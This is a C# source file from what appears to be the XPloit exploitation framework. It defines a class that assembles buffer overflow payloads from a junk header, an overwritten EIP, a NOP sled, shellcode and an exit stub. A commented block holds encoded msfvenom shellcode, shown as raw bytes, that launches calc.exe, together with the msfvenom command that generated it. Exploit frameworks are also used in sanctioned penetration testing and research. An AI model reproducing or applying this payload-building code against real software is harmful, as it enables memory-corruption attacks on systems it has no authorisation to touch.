using System;
using XPloit.Core.Enums;
using XPloit.Core.Extensions;
using XPloit.Core.Helpers;
using XPloit.Core.Interfaces;

namespace XPloit.Core.Requirements.Payloads
{
    public class BufferOverflowPayloadRequirement : IPayloadRequirements
    {
        public interface IBufferOverflowPayload
        {
            EExitFunc ExitFunction { get; set; }
            byte[] GetValue(Target mod);
        }

        public class BufferOverflowConfig
        {
            public byte[] EIP { get; set; }
            public int Space { get; set; }
            public byte[] BadChars { get; set; }
            public int NopCount { get; set; }
            public int HeaderLength { get; set; }
            //public int StackAdjustment { get; set; }
        }

        public Nop NopGenerator { get; set; }
        public BufferOverflowConfig Config { get; set; }

        public bool IsAllowed(Payload payload)
        {
            if (payload != null && payload is IBufferOverflowPayload)
            {
                // Check size
                return true;
            }

            return false;
        }

        public byte[] Prepare(Target target, IBufferOverflowPayload payload)
        {
            if (Config == null) throw (new ArgumentException("Config"));

            // ahora con nop y encoder (ejecutar calc.exe)
            //Config.NopCount = 4;
            // con 5 nop va y con menos ya no, lo requiere el encoder? donde se sabe cuantos requiere?, como calcularlo?

            byte[] header = PatternHelper.CreateRandom(Config.HeaderLength, Config.BadChars);
            byte[] nops = NopGenerator == null ? new byte[] { } : NopGenerator.CreateJob(Config.NopCount);
            byte[] exit = AsmHelper.GetExitMethod(payload.ExitFunction, target.Platform, target.Arquitecture);
            // Mensajebox (coincide que no tiene badchar hasta el exitfunc)
            byte[] exploit = payload.GetValue(target);

            // sin badchar
            // msfvenom -p windows/exec CMD=calc EXITFUNC=thread -a x86 --platform Windows -f csharp -e x86/shikata_ga_nai -b '\x00'
            //exploit = new byte[220]
            //  {
            //    0xba,0xc5,0x58,0x7e,0xc9,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,
            //    0x31,0x31,0x50,0x13,0x03,0x50,0x13,0x83,0xc0,0xc1,0xba,0x8b,0x35,0x21,0xb8,
            //    0x74,0xc6,0xb1,0xdd,0xfd,0x23,0x80,0xdd,0x9a,0x20,0xb2,0xed,0xe9,0x65,0x3e,
            //    0x85,0xbc,0x9d,0xb5,0xeb,0x68,0x91,0x7e,0x41,0x4f,0x9c,0x7f,0xfa,0xb3,0xbf,
            //    0x03,0x01,0xe0,0x1f,0x3a,0xca,0xf5,0x5e,0x7b,0x37,0xf7,0x33,0xd4,0x33,0xaa,
            //    0xa3,0x51,0x09,0x77,0x4f,0x29,0x9f,0xff,0xac,0xf9,0x9e,0x2e,0x63,0x72,0xf9,
            //    0xf0,0x85,0x57,0x71,0xb9,0x9d,0xb4,0xbc,0x73,0x15,0x0e,0x4a,0x82,0xff,0x5f,
            //    0xb3,0x29,0x3e,0x50,0x46,0x33,0x06,0x56,0xb9,0x46,0x7e,0xa5,0x44,0x51,0x45,
            //    0xd4,0x92,0xd4,0x5e,0x7e,0x50,0x4e,0xbb,0x7f,0xb5,0x09,0x48,0x73,0x72,0x5d,
            //    0x16,0x97,0x85,0xb2,0x2c,0xa3,0x0e,0x35,0xe3,0x22,0x54,0x12,0x27,0x6f,0x0e,
            //    0x3b,0x7e,0xd5,0xe1,0x44,0x60,0xb6,0x5e,0xe1,0xea,0x5a,0x8a,0x98,0xb0,0x30,
            //    0x4d,0x2e,0xcf,0x76,0x4d,0x30,0xd0,0x26,0x26,0x01,0x5b,0xa9,0x31,0x9e,0x8e,
            //    0x8e,0xde,0x7c,0x1b,0xfa,0x76,0xd9,0xce,0x47,0x1b,0xda,0x24,0x8b,0x22,0x59,
            //    0xcd,0x73,0xd1,0x41,0xa4,0x76,0x9d,0xc5,0x54,0x0a,0x8e,0xa3,0x5a,0xb9,0xaf,
            //    0xe1,0x38,0x5c,0x3c,0x69,0x91,0xfb,0xc4,0x08,0xed
            //  };

            if (Config.BadChars != null && Config.BadChars.Length > 0)
            {
                // Encoder
            }

            return header.Concat(Config.EIP).Concat(nops).Concat(exploit).Concat(exit);
        }

        public bool ItsRequired() { return true; }
    }
}